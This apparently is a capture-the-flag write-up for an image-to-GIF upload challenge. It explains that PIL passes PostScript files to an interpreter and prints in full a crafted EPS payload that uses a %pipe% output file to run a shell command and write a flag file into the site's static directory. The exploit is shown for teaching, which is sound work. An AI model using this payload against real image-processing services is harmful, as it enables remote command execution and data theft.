# Exploration #
The website is very simple, and has two buttons: one for a image upload, and a button to upload the file.

Once the file is uploaded it will turn the image into a gif and display it.

Checking the source code provided, the `PIL` library is used to open and modify the images.

# Exfiltration #
`PIL` has a vulnerability in the `Image.open` function. When `PIL` opens a image it checks if the file is a Adobe PostScript file, and if it is it will try to run the script in the file. This can be used to exfiltrate data.

By finding a good script on the internet, I created a image file with the following script:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

The script will create a file called `flag.txt` in the `http://ip:port/static/petpets/flag.txt` directory.

Once the file was uploaded and executed, I was abled to successfully exfiltrate the flag.